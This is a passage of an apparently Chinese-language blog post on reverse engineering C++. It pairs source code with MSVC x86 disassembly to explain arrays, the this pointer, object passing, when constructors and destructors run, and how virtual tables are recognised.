+<li>数组中的数据在内存中的存储是线性连续的，其数据排列顺序由低地址到高地址，数组名称表示该数组的首地址</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nArr[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="comment">// mov     [ebp+var_18], 1</span></span><br><span class="line"><span class="comment">// mov     [ebp+var_14], 2</span></span><br><span class="line"><span class="comment">// mov     [ebp+var_10], 3</span></span><br><span class="line"><span class="comment">// mov     [ebp+var_C], 4</span></span><br><span class="line"><span class="comment">// mov     [ebp+var_8], 5</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>数组作为参数</em></strong></p>
+<ul>
+<li>数组作为函数形参时，函数参数中保存的是数组的首地址，是一个指针变量</li>
+<li>虽然参数是指针变量，但需要特别注意，实参数组名为常量值，而指针或形参数组为变量</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(<span class="keyword">char</span> szBuffer[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    strcpy_s(szBuffer, <span class="number">12</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    <span class="comment">// push    offset aHelloWorld ; &quot;Hello World&quot;   ; 获取常量首地址，并将此地址压入栈中作为 strcpy_s 参数</span></span><br><span class="line">    <span class="comment">// push    0Ch              ; SizeInBytes</span></span><br><span class="line">    <span class="comment">// mov     eax, [ebp+Dst]   ; 取函数参数 szBuffer 地址存入 eax 中</span></span><br><span class="line">    <span class="comment">// push    eax              ; 将 eax 压栈作为 strcpy_s 参数</span></span><br><span class="line">    <span class="comment">// call    ds:__imp_strcpy_s</span></span><br><span class="line">    <span class="comment">// add     esp, 0Ch</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(szBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> szHello[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// mov     dword ptr [ebp+Dst], eax</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_18], eax</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_14], eax</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_10], eax</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_C], eax</span></span><br><span class="line">    </span><br><span class="line">    Show(szHello);</span><br><span class="line">    <span class="comment">// lea     eax, [ebp+Dst]   ; 取数组首地址存入 ecx</span></span><br><span class="line">    <span class="comment">// push    eax              ; 将 eax 作为参数压栈</span></span><br><span class="line">    <span class="comment">// call    sub_411389       ; 调用 Show 函数</span></span><br><span class="line">    <span class="comment">// add     esp, 4           ; 平衡参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>数组作为返回值</em></strong></p>
+<ul>
+<li>数组作为参数时，其定义所在的作用域必然在函数调用以外，在调用之前已经存在</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">RetArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> szBuff[] = &#123; <span class="string">&quot;Hello World&quot;</span> &#125;;</span><br><span class="line">    <span class="comment">// ; 字符串数组初始化为指针</span></span><br><span class="line">    <span class="comment">// mov     eax, ds:dword_417B30</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_14], eax</span></span><br><span class="line">    <span class="comment">// mov     ecx, ds:dword_417B34</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_10], ecx</span></span><br><span class="line">    <span class="comment">// mov     edx, ds:dword_417B38</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_C], edx</span></span><br><span class="line">    <span class="comment">// lea     eax, [ebp+var_14]    ; 使用 eax 保存数组首地址，作为函数返回值，虽然 eax 保存的地址存在，但是当函数结束调用后，此地址中的数据将不稳定，在进行其他对栈空间的读写操作时可能破坏此数据</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> szBuff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RetArray();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="结构体和类"><a href="#结构体和类" class="headerlink" title="结构体和类"></a>结构体和类</h2><ul>
+<li><p><strong><em>this指针</em></strong></p>
+<ul>
+<li>利用寄存器 <code>ecx</code> 保存对象的首地址，并以寄存器传参的方式传递到成员函数中，这便是 this 指针的由来</li>
+<li>所有成员函数都有一个隐藏参数，即自身类型的指针，这便是 this 指针，将这一的默认调用约定称为 <code>thiscall</code> </li>
+<li>在成员函数中访问数据成员也是通过 this 指针间接访问的</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SetNumber</span><span class="params">(<span class="keyword">int</span> nNumber)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// push    ebp</span></span><br><span class="line">    <span class="comment">// mov     ebp, esp</span></span><br><span class="line">    <span class="comment">// sub     esp, 0CCh</span></span><br><span class="line">    <span class="comment">// push    ebx</span></span><br><span class="line">    <span class="comment">// push    esi</span></span><br><span class="line">    <span class="comment">// push    edi</span></span><br><span class="line">    <span class="comment">// push    ecx                  ; ecx 中保存了对象 test 的首地址</span></span><br><span class="line">    <span class="comment">// lea     edi, [ebp+var_CC]</span></span><br><span class="line">    <span class="comment">// mov     ecx, 33h</span></span><br><span class="line">    <span class="comment">// mov     eax, 0CCCCCCCCh</span></span><br><span class="line">    <span class="comment">// rep stosd</span></span><br><span class="line">    <span class="comment">// pop     ecx                  ; 还原 ecx</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_8], ecx     ; 将 ecx 中的数据存入 ebp+var_8 处，该地址保存着调用对象的首地址，即 this 指针</span></span><br><span class="line">    </span><br><span class="line">        m_nInt = nNumber;</span><br><span class="line">        <span class="comment">// mov     eax, [ebp+var_8] ; 取出对象的首地址并存入到 eax</span></span><br><span class="line">        <span class="comment">// mov     ecx, [ebp+arg_0] ; 取出参数中的数据并保存到 ecx 中</span></span><br><span class="line">        <span class="comment">// mov     [eax], ecx       ; 给 m_nInt 赋值 --&gt; mov dword ptr [eax+0],eax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> m_nInt;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CTest test;</span><br><span class="line">    test.SetNumber(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// push    5                    ; 压入参数</span></span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_C]     ; 取出对象 test 的首地址存入 ecx 中</span></span><br><span class="line">    <span class="comment">// call    sub_4112EE           ; 调用成员函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>使用 <code>thiscall</code> 调用方式的成员函数的要点分析</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lea ecx, [mem]          ; 取对象首地址并存入 ecx 中</span><br><span class="line">call FUN_ADDRESS        ; 调用成员函数</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><strong><em>对象作为函数参数</em></strong></p>
+<ul>
+<li>数组变量的名称代表数组的首地址，而对象的变量名称却不能代表对象的首地址，传参时不会像数组那样以首地址作为参数传递，而是先将对象中的所有数据进行备份，将复制的数据作为形参传递到调用函数中使用</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> m_nOne;</span><br><span class="line">    <span class="keyword">int</span> m_nTwo;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowFUnTest</span><span class="params">(CTest test)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, test.m_nOne, test.m_nTwo);</span><br><span class="line">    <span class="comment">// mov     eax, [ebp+arg_4]     ; 取出数据成员 m_nTwo 作为 printf 函数的第三个参数</span></span><br><span class="line">    <span class="comment">// push    eax</span></span><br><span class="line">    <span class="comment">// mov     ecx, [ebp+arg_0]     ; 取出数据成员 m_nOne 作为 printf 函数的第二个参数</span></span><br><span class="line">    <span class="comment">// push    ecx</span></span><br><span class="line">    <span class="comment">// push    offset aDD      ; &quot;%d %d&quot;</span></span><br><span class="line">    <span class="comment">// call    sub_41104B</span></span><br><span class="line">    <span class="comment">// add     esp, 0Ch</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CTest test;</span><br><span class="line">    test.m_nOne = <span class="number">1</span>;</span><br><span class="line">     <span class="comment">// mov     [ebp+var_C], 1</span></span><br><span class="line">    </span><br><span class="line">    test.m_nTwo = <span class="number">2</span>;</span><br><span class="line">     <span class="comment">// mov     [ebp+var_8], 2</span></span><br><span class="line">    </span><br><span class="line">    ShowFUnTest(test);</span><br><span class="line">    <span class="comment">// mov     eax, [ebp+var_8]</span></span><br><span class="line">    <span class="comment">// push    eax                  ; 传入数据成员 m_nTwo</span></span><br><span class="line">    <span class="comment">// mov     ecx, [ebp+var_C]</span></span><br><span class="line">    <span class="comment">// push    ecx                  ; 传入数据成员 m_nOne</span></span><br><span class="line">    <span class="comment">// call    sub_4110E6</span></span><br><span class="line">    <span class="comment">// add     esp, 8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>对象作为返回值</em></strong></p>
+<ul>
+<li>对象作为返回值时，进入函数后将申请返回对象使用的栈空间，在退出函数时，将返回对象中的数据复制到临时的栈空间中，以这个临时栈空间的首地址作为返回值</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> m_nNumber;</span><br><span class="line">    <span class="keyword">int</span> m_nArry[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">CTest <span class="title">GetCTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CTest testObj;</span><br><span class="line">    testObj.m_nNumber = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        testObj.m_nArry[i] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> testObj;</span><br><span class="line">    <span class="comment">// mov     ecx, 0Bh             ; 设置循环次数</span></span><br><span class="line">    <span class="comment">// lea     esi, [ebp+var_30]    ; 获取局部对象的首地址</span></span><br><span class="line">    <span class="comment">// mov     edi, [ebp+arg_0]     ; 获取返回对象的首地址</span></span><br><span class="line">    <span class="comment">// rep movsd                    ; 将局部对象中的数据复制到返回对象中</span></span><br><span class="line">    <span class="comment">// mov     eax, [ebp+arg_0]     ; 获取返回对象的首地址并保存到 eax 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CTest test;</span><br><span class="line">    test = GetCTest();</span><br><span class="line">    <span class="comment">// lea     eax, [ebp+var_158]       ; 获取返回对象的栈空间首地址</span></span><br><span class="line">    <span class="comment">// push    eax                      ; 将返回对象的首地址压入栈中，用于保存返回对象的数据</span></span><br><span class="line">    <span class="comment">// call    sub_411389</span></span><br><span class="line">    <span class="comment">// add     esp, 4</span></span><br><span class="line">    <span class="comment">// mov     ecx, 0Bh                 ; 设置循环次数</span></span><br><span class="line">    <span class="comment">// mov     esi, eax                 ; 将返回对象的首地址存入 esi</span></span><br><span class="line">    <span class="comment">// lea     edi, [ebp+var_124]       ; 获取临时对象的首地址</span></span><br><span class="line">    <span class="comment">// rep movsd</span></span><br><span class="line">    <span class="comment">// mov     ecx, 0Bh                 ; 重新设置次数</span></span><br><span class="line">    <span class="comment">// lea     esi, [ebp+var_124]       ; 获取临时对象的首地址</span></span><br><span class="line">    <span class="comment">// lea     edi, [ebp+var_30]        ; 获取对象 test 的首地址</span></span><br><span class="line">    <span class="comment">// rep movsd</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, test.m_nNumber, test.m_nArry[<span class="number">0</span>], test.m_nArry[<span class="number">9</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h2><ul>
+<li><p><strong>构造函数出现的时机</strong></p>
+<ul>
+<li><p><strong><em>局部对象</em></strong></p>
+<ul>
+<li>当对象产生时，便有可能引发构造函数的调用</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNumber</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CNumber()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// lea     ecx, [ebp+var_C] ; 取得对象首地址，传入 ecx 作为参数</span></span><br><span class="line">        <span class="comment">// call    sub_411302       ; 调用构造函数</span></span><br><span class="line">    </span><br><span class="line">        m_nNumber = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// mov     eax, [ebp+var_8]     ; eax 中保存了对象的首地址</span></span><br><span class="line">        <span class="comment">// mov     dword ptr [eax], 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m_nNumber;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CNumber num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>识别局部对象的构造函数的条件<ul>
+<li>该成员函数是这个对象在作用域内调用的第一个函数，根据 this 指针即可以区分每个对象</li>
+<li>这个函数返回 this 指针</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong><em>堆对象</em></strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNumber</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CNumber()</span><br><span class="line">    &#123;</span><br><span class="line">        m_nNumber = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m_nNumber;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CNumber *pNum = <span class="literal">NULL</span>;</span><br><span class="line">    pNum = <span class="keyword">new</span> CNumber;</span><br><span class="line">    <span class="comment">// push    4               ; Size   申请堆内存</span></span><br><span class="line">    <span class="comment">// call    j_??2@YAPAXI@Z  ; operator new(uint)</span></span><br><span class="line">    <span class="comment">// add     esp, 4</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_EC], eax    ; 使用临时变量保存 new 返回值</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_4], 0       ; [ebp+var_4] 保存申请堆空间的次数</span></span><br><span class="line">    <span class="comment">// cmp     [ebp+var_EC], 0      ; 检测堆内存是否申请成功</span></span><br><span class="line">    <span class="comment">// jz      short loc_411921</span></span><br><span class="line">    <span class="comment">// mov     ecx, [ebp+var_EC]    </span></span><br><span class="line">    <span class="comment">// call    sub_411375           ; 调用构造函数</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_F4], eax    ; 构造函数返回 this 指针，保存到临时变量[ebp+var_F4]中</span></span><br><span class="line">    <span class="comment">// jmp     short loc_41192B</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_F4], 0      ; 申请堆空间失败，设置指针值为 NULL</span></span><br><span class="line">    <span class="comment">// mov     eax, [ebp+var_F4]</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_E0], eax</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_4], 0FFFFFFFFh</span></span><br><span class="line">    <span class="comment">// mov     ecx, [ebp+var_E0]</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_14], ecx</span></span><br><span class="line">    </span><br><span class="line">    pNum-&gt;m_nNumber = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// mov     eax, [ebp+var_14]    ; eax 得到 this 指针</span></span><br><span class="line">    <span class="comment">// mov     dword ptr [eax], 2   ; 为成员变量 m_nNum 赋值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>参数对象</em></strong></p>
+<ul>
+<li>当对象作为函数参数时，调用一个特殊的构造函数–拷贝构造函数，该构造函数只有一个参数，类型为对象的引用</li>
+</ul>
+</li>
+<li><p><strong><em>返回对象</em></strong></p>
+</li>
+<li><p><strong><em>全局对象</em></strong></p>
+<ul>
+<li><p>构造函数会早于main函数的开始</p>
+</li>
+<li><p>构造函数会在<code>_initterm</code>中被调用</p>
+</li>
+<li><p>编写源码，在全局对象的构造函数中设置断点，查看调用堆栈</p>
+<p><img data-src="/images/asm/1.png"></p>
+</li>
+<li><p>定位到 <code>_initterm</code> 函数，查看其中的内容</p>
+<p><img data-src="/images/asm/2.png"></p>
+</li>
+<li><p>根据函数的实现，将*<strong>特征码*</strong>提取出来，不同环境下的特征码可能不同</p>
+<p><img data-src="/images/asm/3.png"></p>
+</li>
+<li><p>找到 <code>__scrt_common_main_seh</code> 函数，在调用 invoke_main 之前，它调用了 <code>initterm</code> 函数，根据特征，两组 push + push _ call 的第二组</p>
+</li>
+</ul>
+</li>
+<li><p><strong><em>静态对象</em></strong></p>
+</li>
+</ul>
+<ul>
+<li><p><strong>析构函数的出现时机</strong></p>
+<ul>
+<li><p><strong><em>局部对象</em></strong>：作用域结束前调用析构函数</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNumber</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CNumber()</span><br><span class="line">    &#123;</span><br><span class="line">        m_nNumber = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~CNumber()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;~CNumber()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m_nNumber;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CNumber number;</span><br><span class="line">    <span class="comment">// call    sub_411320</span></span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_C] ; 调用析构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>堆对象</em></strong>：释放堆空间前调用析构函数</p>
+</li>
+<li><p><strong><em>参数对象</em></strong>：退出函数前，调用参数对象的析构函数</p>
+</li>
+<li><p><strong><em>返回对象</em></strong>：如无对象引用定义，退出函数后，调用返回对象的析构函数，否则与对象引用的作用域一致</p>
+</li>
+<li><p><strong><em>全局对象</em></strong>：main 函数退出后调用析构函数</p>
+<ul>
+<li><p>通过在析构函数设置断点进行栈回溯</p>
+<p><img data-src="/images/asm/4.png"></p>
+</li>
+<li><p>分析函数获取*<strong>特征码*</strong>(exe!_execute_onexit_table::__l2<lambda>())</p>
+<p><img data-src="/images/asm/5.png"></p>
+</li>
+</ul>
+</li>
+<li><p><strong><em>静态对象</em></strong>：main 函数退出后调用析构函数</p>
+</li>
+</ul>
+<h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><ul>
+<li>一个类对象的内存中可能存在多个虚表指针</li>
+<li>虚函数表一般存在只读数据段（<code>.rdata</code>）</li>
+<li>程序编译时，会自动生成虚函数表</li>
+<li>如果有继承关系，父类和子类虚函数一样，也会有两个虚函数表，他们的虚函数表指针都是在各自的构造函数中初始化的</li>
+<li>构造函数中会初始化本类的虚函数表指针</li>
+<li>当父类指针指向子类对象时，虚函数调用才会访问虚函数表</li>
+</ul>
+<ul>
+<li><p><strong><em>虚函数的机制</em></strong></p>
+<ul>
+<li>对于函数构造函数的类而言，其虚表初始化过程中和默认构造函数相同，都是以对象首地址的前4字节数据保存虚表的首地址</li>
+<li>在虚表指针的初始化过程中，对象执行了构造函数后，就得到了虚表指针，当其他代码访问这个对象的虚函数时，会根据对象的首地址，取出对应虚表元素。当函数被调用时，会间接访问虚表，得到对应的虚函数首地址，并调用执行</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CObj</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ; CObj::CObj        <span class="comment">// 编译器为类提供的默认构造函数</span></span><br><span class="line">    <span class="comment">// pop     ecx                  ; 还原 this 指针</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_8], ecx     ; [ebp+var_8] 存储 this 指针</span></span><br><span class="line">    <span class="comment">// mov     eax, [ebp+var_8]     ; 取出 this 指针并保存到 eax 中，这个地址将会作为指针保存到虚表的首地址中</span></span><br><span class="line">    <span class="comment">// mov     dword ptr [eax], offset ??_7CObj@@6B@ ; const CObj::`vftable&#x27; 取虚表的首地址，保存到虚表指针中</span></span><br><span class="line">    <span class="comment">// mov     eax, [ebp+var_8]     ; 返回对象首地址</span></span><br><span class="line">    <span class="comment">// pop     edi</span></span><br><span class="line">    <span class="comment">// pop     esi</span></span><br><span class="line">    <span class="comment">// pop     ebx</span></span><br><span class="line">    <span class="comment">// mov     esp, ebp</span></span><br><span class="line">    <span class="comment">// pop     ebp</span></span><br><span class="line">    <span class="comment">// retn</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">GetNumber</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_nNumber;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">SetNumber</span><span class="params">(<span class="keyword">int</span> nNumber)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        m_nNumber = nNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_nNumber;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CObj obj;</span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_10]    ; 获取对象首地址</span></span><br><span class="line">    <span class="comment">// call    sub_4111E5           ; 调用虚函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>当直接使用对象调用自身的虚函数时，没有必要查表访问。因为已经明确调用的是自身的成员函数，根本没有构成多态性</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CObj</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">GetNumber</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_nNumber;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">SetNumber</span><span class="params">(<span class="keyword">int</span> nNumber)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        m_nNumber = nNumber;</span><br><span class="line">        <span class="comment">// mov     eax, [ebp+var_8]</span></span><br><span class="line">        <span class="comment">// mov     ecx, [ebp+arg_0]</span></span><br><span class="line">        <span class="comment">// mov     [eax+4], ecx</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_nNumber;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CObj obj;</span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_10]</span></span><br><span class="line">    <span class="comment">// call    sub_4111E5</span></span><br><span class="line">    </span><br><span class="line">    obj.SetNumber(argc);</span><br><span class="line">    <span class="comment">// mov     eax, [ebp+argc]      </span></span><br><span class="line">    <span class="comment">// push    eax</span></span><br><span class="line">    <span class="comment">// lea     ecx, [ebp+var_10]</span></span><br><span class="line">    <span class="comment">// call    sub_41132F       ; 直接调用函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>如何判断是否是虚函数</em></strong></p>
+<ul>
+<li>类中隐式定义了一个数据成员</li>
+<li>该数据成员在首地址处，占4字节</li>
+<li>构造函数会将此数据成员初始化为某个数组的首地址</li>
+<li>这个地址属于数据区，是相对固定的地址</li>
+<li>在这个数组内，每个元素都函数指针</li>
+<li>函数被调用时，第一个参数必然是 this 指针（注意调用约定）</li>
+<li>在函数内部，很有可能会对 this 指针使用相对间接的访问方式</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Release 版</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CObj</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CObj()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    CObj(<span class="keyword">int</span> nInt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CObj(int nInt) %d&quot;</span>, nInt);</span><br><span class="line">    &#125;</span><br><span class="line">    CObj(<span class="keyword">const</span> <span class="keyword">char</span> *pChar)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CObj(char *pChar) %s&quot;</span>, pChar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~CObj()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ~CObj()\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;对象首地址：0x%08x&quot;</span>, <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CObj g_obj_void;</span><br><span class="line"><span class="function">CObj <span class="title">g_obj_int</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span 